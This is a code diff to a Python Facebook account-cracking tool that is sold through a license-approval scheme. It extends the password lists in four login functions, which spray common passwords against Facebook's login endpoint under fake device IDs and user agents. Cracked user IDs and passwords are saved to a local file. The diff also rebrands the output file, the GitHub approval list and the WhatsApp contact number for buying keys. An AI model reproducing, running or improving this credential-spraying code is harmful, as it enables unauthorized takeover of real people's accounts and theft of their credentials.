@@ -733,7 +733,7 @@ def login1(uid):
         sys.stdout.flush()
         ua = random.choice(ugen)
         ua = windows()
-        for pw in ["123456","1234567","12345678","123456789","111222"]:
+        for pw in ["123456","1234567","12345678","123456789","111222","1234567890","136900","iloveyou","i love you","i love allah"]:
             data = {'adid':str(uuid.uuid4()),
             'format': 'json',
             'device_id':str(uuid.uuid4()),
@@ -794,7 +794,7 @@ def login2(uid):
         sys.stdout.flush()
         ua = random.choice(ugen)
         ua = windows()
-        for pw in ["123456","1234567","12345678","123456789","111222"]:
+        for pw in ["123456","1234567","12345678","123456789","111222","1234567890","136900","iloveyou","i love you","i love allah"]:
             data = {'adid':str(uuid.uuid4()),
             'format': 'json',
             'device_id':str(uuid.uuid4()),
@@ -855,7 +855,7 @@ def login3(uid):
         sys.stdout.flush()
         ua = random.choice(ugen)
         ua = windows()
-        for pw in ["123456","1234567","12345678","123456789","111222"]:
+        for pw in ["123456","1234567","12345678","123456789","111222","1234567890","136900","iloveyou","i love you","i love allah"]:
             data = {'adid':str(uuid.uuid4()),
             'format': 'json',
             'device_id':str(uuid.uuid4()),
@@ -916,7 +916,7 @@ def login4(uid):
         sys.stdout.flush()
         ua = random.choice(ugen)
         ua = windows()
-        for pw in ["123456","1234567","12345678","123456789","111222"]:
+        for pw in ["123456","1234567","12345678","123456789","111222","1234567890","136900","iloveyou","i love you","i love allah"]:
             data = {'adid':str(uuid.uuid4()),
             'format': 'json',
             'device_id':str(uuid.uuid4()),
@@ -958,12 +958,12 @@ def login4(uid):
             rp = requests.post(url,data=data,headers=head,allow_redirects=False,verify=True).json()
             if "session_key" in rp:            	
                 print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mSIFAT\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97m● \x1b[38;5;46m{pw}\033[1;97m');os.system('espeak -a 300 " Cracked Ok id,"')
-                open("/sdcard/SIFAT-M4-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
+                open("/sdcard/SHANTO-M4-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
                 cps.append(uid)
                 break
             elif "www.facebook.com" in rp['error']['message']:
                 print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mSIFAT\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97m● \x1b[38;5;46m{pw}\033[1;97m');os.system('espeak -a 300 " Cracked Ok id,"')
-                open("/sdcard/SIFAT-M4-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
+                open("/sdcard/SHANTO-M4-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
                 oks.append(uid)
                 break
             else:continue
@@ -976,7 +976,7 @@ def meyexudi():
   uuid = "md"+str(os.getuid())+"sifat"+str(os.getuid())+"PAID.TOOL"
   id = ''.join(uuid)
   try:
-    httpCaht = requests.get(f"https://github.com/sifat403/approval/blob/main/approval.txt").text
+    httpCaht = requests.get(f"https://github.com/X74TEAM/DEVHIS/blob/main/approval.txt").text
     if id in httpCaht:
       msg = str(os.geteuid())
       print()
@@ -994,7 +994,7 @@ def meyexudi():
       print(" \x1b[0m║══[KEY]  : "+id)
       uname =input('\033[1;97m[\033[1;92m•\033[1;97m]\033[1;92m WHAT IS YOUR NAME \033[1;91m: \33[1;32m')
       input(' \033[1;30m╚══[•] IF U WANT TO BUY THEN PRESS ENTER ')
-      tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+id);os.system('am start https://wa.me/+8801848580864?text='+tks),approval()       
+      tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+id);os.system('am start https://wa.me/+8801644811180?text='+tks),approval()       
   except:
     sys.exit()
 print(logo)
